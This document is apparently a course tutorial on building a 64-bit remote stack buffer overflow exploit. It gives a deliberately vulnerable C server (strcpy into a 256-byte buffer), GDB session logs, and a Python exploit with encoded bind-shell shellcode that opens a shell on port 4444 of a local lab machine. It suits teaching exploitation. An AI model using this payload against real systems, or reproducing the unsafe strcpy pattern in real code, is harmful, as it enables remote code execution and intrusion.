# Development of a remote buffer overflow exploit - 64 bit

## Introduction

We will create a functional exploit for a remote 64 bit program with a stack overflow vulnerability. This includes
finding the vulnerability, get all necessary information for our exploit, and create a sample exploit as
python program.

## Goal

* Implement a fully working exploit for x64 server program
* Get our static and dynamic analysis skills to the next level

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <string.h>

// hash of: "ourteacheristehbest"
const char *adminHash = "$6$saaaaalty$cjw9qyAKmchl7kQMJxE5c1mHN0cXxfQNjs4EhcyULLndQR1wXslGCaZrJj5xRRBeflfvmpoIVv6Vs7ZOQwhcx.";


int checkPassword(char *password) {
	char *hash;

	// $6$ is SHA256
	hash = crypt(password, "$6$saaaaalty");

	if (strcmp(hash, adminHash) == 0) {
		return 1;
	} else {
		return 0;
	}
}



void handleData(char *username, char *password) {
	int isAdmin = 0;
	char firstname[256];

	isAdmin = checkPassword(password);
	strcpy(firstname, username);

	if(isAdmin > 0) {
		printf("You ARE admin!\nBe the force with you.\nisAdmin: 0x%x\n", isAdmin);
	} else {
		printf("You are not admin.\nLame.\n");
	}
}

void doprocessing (int sock) {
	char username[1024];
	char password[1024];

	printf("Client connected\n");

	bzero(username, sizeof(username));
	bzero(password, sizeof(password));

	int n;

	n = read(sock, username, 1023);
	//n = read(sock, password, 1023);

	printf("Username: %s\n", username);
	//printf("Password: %s\n", password);

	handleData(username, password);
}


int main( int argc, char *argv[] ) {
   int sockfd, newsockfd, portno, clilen;
   char buffer[256];
   struct sockaddr_in serv_addr, cli_addr;
   int n, pid;

   /* First call to socket() function */
   sockfd = socket(AF_INET, SOCK_STREAM, 0);

   if (sockfd < 0) {
      perror("ERROR opening socket");
      exit(1);
   }

   /* Initialize socket structure */
   bzero((char *) &serv_addr, sizeof(serv_addr));
   portno = 5001;

   serv_addr.sin_family = AF_INET;
   serv_addr.sin_addr.s_addr = INADDR_ANY;
   serv_addr.sin_port = htons(portno);

   /* Now bind the host address using bind() call.*/
   if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
      perror("ERROR on binding");
      exit(1);
   }

   /* Now start listening for the clients, here
      * process will go in sleep mode and will wait
      * for the incoming connection
   */

   listen(sockfd,5);
   clilen = sizeof(cli_addr);

   while (1) {
      newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

      if (newsockfd < 0) {
         perror("ERROR on accept");
         exit(1);
      }
  /* Create child process */
      pid = fork();

      if (pid < 0) {
         perror("ERROR on fork");
         exit(1);
      }

      if (pid == 0) {
         /* This is the client process */
         close(sockfd);
         doprocessing(newsockfd);
         exit(0);
      }
      else {
         close(newsockfd);
      }

   } /* end of while */
}
```



## Vulnerability

The vulnerability lies here:

```
void handleData(char *username, char *password) {
	[...]
	char firstname[256];

	[...]
	strcpy(firstname, username);
	[...]
}


void doprocessing (int sock) {
	char username[1024];
	[...]
	int n;

	n = read(sock, username, 1023);
	[...]
	handleData(username, password);
}
```

The server reads a maximum of 1023 bytes, and copies it into a username buffer
of size 1024 bytes. It then gives this buffer to the function `handleData` as
argument `username`, which in turn copies it in a buffer which is only 256 bytes.


## Debugging notes

### Hanging

The program may hang. If you debug it again, you have to kill it:
```
root@hlUbuntu64:~/challenges/challenge13# ./challenge13
ERROR on binding: Address already in use

root@hlUbuntu64:~/challenges/challenge13# ps axw | grep challenge13
16799 pts/1    S      0:00 /root/challenges/challenge13/challenge13
16825 pts/1    S+     0:00 grep --color=auto challenge13
root@hlUbuntu64:~/challenges/challenge13# kill 16799
```

### Re-attaching

Set `follow-fork-mode child` in GDB to follow the children.
Reattach to the parent when the child crashed:

Start GDB:

```
root@hlUbuntu64:~/challenges/challenge13# gdb -q ./challenge13
Reading symbols from ./challenge13...(no debugging symbols found)...done.
gdb-peda$ set follow-fork-mode child
gdb-peda$ r
Starting program: /root/challenges/challenge13/challenge13
[New process 16843]
```

Start the exploit:
```
root@hlUbuntu64:~/challenges/challenge13# python challenge13-exp-skel.py | nc localhost 5001
```

Output of GDB:
```
[...]
Stopped reason: SIGSEGV
0x0000000041414141 in ?? ()
```

Find out PID of parent:
```
root@hlUbuntu64:~/challenges/challenge13# ps axw | grep challenge13
16835 pts/1    S+     0:00 gdb -q ./challenge13
16837 pts/1    S      0:00 /root/challenges/challenge13/challenge13
16843 pts/1    t      0:00 /root/challenges/challenge13/challenge13
16845 pts/2    S+     0:00 grep --color=auto challenge13
```

Re-attach to parent:
```
gdb-peda$ attach 16837
Attaching to program: /root/challenges/challenge13/challenge13, process 16837
gdb-peda$ c
Continuing.
```

## Overwrite SIP

Here is the prepared exploit. The offset is already correct (at 280 bytes).

```python
#!/usr/bin/python

import sys
import socket

shellcode = "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05\xef" + "\xff\xff\xff\x48\xbb\xd2\x44\xe6\x0a\xfb\xc8\x96\x10\x48" + "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xb8\x6d\xbe" + "\x93\x91\xca\xc9\x7a\xd3\x1a\xe9\x0f\xb3\x5f\xc4\xd7\xd6" + "\x60\xe4\x0a\xea\x94\xde\x99\x34\x2e\xf6\x50\x91\xf9\xce" + "\x1f\xd7\x2e\xd4\x52\xf4\xcd\xde\x21\x24\x2e\xcd\x52\xf4" + "\xcd\xde\x87\xb8\x47\xb8\x42\x04\x06\xfc\x31\x8a\x4b\xe3" + "\x7f\x0d\xa2\xad\x48\x4b\x0c\x5d\x25\x99\xa1\xf8\x3f\xa1" + "\x2c\xe6\x59\xb3\x41\x71\x42\x85\x0c\x6f\xec\xf4\xcd\x96" + "\x10"

buf_size = 256
offset = 280

ret_addr = "AAAA"

# 64 bytes
exploit = "\x90" * (buf_size - len(shellcode))
exploit += shellcode

# fill a bit
exploit += "A" * (offset - len(exploit))

exploit += ret_addr

sys.stdout.write(exploit)
```

Start the server:
```
root@hlUbuntu64:~/challenges/challenge13# gdb -q ./challenge13
Reading symbols from ./challenge13...(no debugging symbols found)...done.
gdb-peda$ set follow-fork-mode child
gdb-peda$ run
Starting program: /root/challenges/challenge13/challenge13
```

Execute the exploit POC:
```
root@hlUbuntu64:~/challenges/challenge13# python challenge13-exp-skel.py | nc localhost 5001
```

Result:
```
Client connected
Username: [...]
You ARE admin!
Be the force with you.
isAdmin: 0x41414141

Thread 2.1 "challenge13" received signal SIGSEGV, Segmentation fault.
[Switching to process 16794]


 [----------------------------------registers-----------------------------------]
RAX: 0x3a (':')
RBX: 0x0
RCX: 0x7fffffc6
RDX: 0x7ffff7b9b780 --> 0x0
RSI: 0x1
RDI: 0x1
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffdbc0 --> 0x37ffff1a0
RIP: 0x41414141 ('AAAA')
R8 : 0x0
R9 : 0x3a (':')
R10: 0x0
R11: 0x246
R12: 0x400930 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe620 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdbc0 --> 0x37ffff1a0
0008| 0x7fffffffdbc8 --> 0x4ffffdd20
0016| 0x7fffffffdbd0 --> 0x0
0024| 0x7fffffffdbd8 --> 0x0
0032| 0x7fffffffdbe0 --> 0x0
0040| 0x7fffffffdbe8 --> 0x0
0048| 0x7fffffffdbf0 --> 0x0
0056| 0x7fffffffdbf8 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000041414141 in ?? ()
gdb-peda$
```

We have correctly overwritten SIP with `0x41414141`, as RIP is `0x0000000041414141`.

The shellcode is located at position `0x7fffffffdfd8`:
```
gdb-peda$ x/32x 0x7fffffffdf08
0x7fffffffdf08: 0x0000000000000000      0x0000000000000000
0x7fffffffdf18: 0x0000000000000000      0x0000000000000000
0x7fffffffdf28: 0x0000000000000000      0x0000000000000000
0x7fffffffdf38: 0x0000000000000000      0x0000000000000000
0x7fffffffdf48: 0x0000000000000000      0x0000000000000000
0x7fffffffdf58: 0x0000000000000000      0x0000000000000000
0x7fffffffdf68: 0x0000000000000000      0x0000000000000000
0x7fffffffdf78: 0x0000000000000000      0x0000000000000000
0x7fffffffdf88: 0x0000000000000000      0x0000000000000000
0x7fffffffdf98: 0x0000000000000000      0x0000000000000000
0x7fffffffdfa8: 0x0000000000000000      0x0000000000000000
0x7fffffffdfb8: 0x0000000000000000      0x0000000000000000
0x7fffffffdfc8: 0x0000000000000000      0x9090909090909090
0x7fffffffdfd8: 0x9090909090909090      0x9090909090909090
0x7fffffffdfe8: 0x9090909090909090      0x9090909090909090
0x7fffffffdff8: 0x9090909090909090      0x9090909090909090
```

## Exploit

We use the shellcode address `0x7fffffffdfd8`:
```python
ret_addr = "AAAA"
ret_addr = "\x7f\xff\xff\xff\xdf\xf8"[::-1]
```

We convert the address with `[::-1]` in little-endian format.

Test it:
```
root@hlUbuntu64:~/challenges/challenge13# gdb -q ./challenge13
Reading symbols from ./challenge13...(no debugging symbols found)...done.
gdb-peda$ set follow-fork-mode child
gdb-peda$ r
Starting program: /root/challenges/challenge13/challenge13
[New process 16806]
Client connected
Username: [...]
You ARE admin!
Be the force with you.
isAdmin: 0x41414141
```

Afterwards we can connect to localhost:4444, where the shellcode started our shell:
```
root@hlUbuntu64:~/challenges/challenge13# nc localhost 4444
ls
Makefile
challenge13
challenge13-exp-skel.py
challenge13-exp.py
challenge13.c
peda-session-challenge13.txt
```

GDB will provide some more output:
```
process 16806 is executing new program: /bin/dash
[New process 16808]
process 16808 is executing new program: /bin/ls
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 3 (process 16808) exited normally]
Warning: not running or target is remote
```

## Questions

* Can you make the exploit work, if the program is started standalone (without GDB)?
* Instead of the listener shellcode, can you use a connect-back shellcode?
